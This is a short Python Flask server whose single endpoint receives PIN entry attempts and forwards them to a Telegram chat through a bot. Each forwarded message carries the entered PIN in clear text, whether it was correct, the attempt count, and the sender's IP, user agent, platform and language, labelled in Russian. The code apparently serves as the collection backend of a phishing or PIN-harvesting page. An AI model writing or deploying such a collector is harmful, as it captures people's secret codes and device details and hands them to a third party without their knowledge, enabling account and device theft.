from flask import Flask, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/log-pin', methods=['POST'])
def log_pin():
    try:
        data = request.get_json() or {}

        timestamp = data.get('timestamp', datetime.utcnow().isoformat() + 'Z')
        entered_pin = data.get('entered_pin', '—')
        success = data.get('success', False)
        ip = data.get('ip', 'неизвестно')
        user_agent = data.get('user_agent', '—')
        platform = data.get('platform', '—')
        language = data.get('language', '—')
        attempts = data.get('attempts', 0)

        status = "✅ Успешно" if success else "❌ Неверный PIN"

        message = f"""🔒 <b>Попытка ввода PIN</b>

🕒 {timestamp}
{status}
🔑 PIN: <code>{entered_pin}</code>
🔢 Попытка №{attempts}

🌐 IP: <code>{ip}</code>
📱 UA: <code>{user_agent[:150]}...</code>
🖥 {platform} | {language}"""

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }

        r = requests.post(url, json=payload, timeout=15)
        if r.status_code != 200:
            print("Telegram error:", r.text)

        return jsonify({"status": "sent"})
    except Exception as e:
        print("Error in /log-pin:", str(e))
        return jsonify({"status": "error"}), 500


# Для bothost / gunicorn
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
